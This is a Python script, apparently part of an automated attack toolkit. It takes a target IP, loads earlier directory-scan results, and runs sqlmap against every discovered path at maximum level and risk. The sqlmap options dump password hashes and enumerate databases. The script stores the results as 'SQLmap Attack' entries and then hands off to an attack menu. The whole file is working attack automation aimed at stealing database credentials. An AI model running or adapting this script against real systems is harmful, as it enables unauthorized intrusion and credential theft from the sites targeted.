import subprocess
import json
import sys
import os
import threading
import time
from colorama import Fore, Style, Back

# Get the IP address from the command line arguments
Ip = sys.argv[1]
Hostname = sys.argv[2]

# Set the flag to stop all threads
stop_threads = False

# Load the JSON data from the file if it exists
data = {}
if os.path.isfile('database.json'):
    with open('database.json') as f:
        data = json.load(f)

# Search for the Directory scan result that matches the php keyword
dir_result = None
if 'DIRECTORY SCAN' in data:
    scan_results = data['DIRECTORY SCAN']['Scan_Results']
    dir_result = scan_results if isinstance(scan_results, list) else scan_results.split('\n')

def loading_animation():
    animations = ['\\', '|', '/', '-']
    idx = 0
    while not stop_threads:
        print('\rScanning for SQL injection vulnerabilities... ' + animations[idx % len(animations)], end='', flush=True)
        idx += 1
        time.sleep(0.1)

def run_sqlmap(ip, dir_result):
    global stop_threads
    if dir_result is None:
        print("Directory scan results not found.")
        return
    
    stop_threads = False
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()

    # Extract directory names from the scan results
    dirs = [item['Directory'] for item in dir_result]

    for directory in dirs:
        command = ['sqlmap', '-u', f'http://{ip}/{directory}', '--level=3', '--risk=3', '--technique=BEUSTQ', '--passwords', '--dbs', '--batch', '--disable-coloring', '--output-dir=/assets/collected/sqlmap_data.json']

        result = subprocess.run(command, capture_output=True, text=True)
        
        print("\n------------------------------------------------------------")
        print(Fore.YELLOW + f"SQLmap Results for {directory}:" + Style.RESET_ALL)
        print(result.stdout)
        print("\n------------------------------------------------------------")
        
        # Save the SQLmap attack information to the JSON file
        data[f'SQLmap Attack - {directory}'] = {'Results': result.stdout}
        with open('database.json', 'w') as f:
            json.dump(data, f, indent=4)
        
        # Check if an error occurred during the scan
        if result.returncode != 0:
            print("Error occurred during SQLmap scan for", directory)
            continue
    
    stop_threads = True
    loading_thread.join()

    subprocess.call(['python3', 'attack_menu.py', ip, Hostname])

run_sqlmap(Ip, dir_result)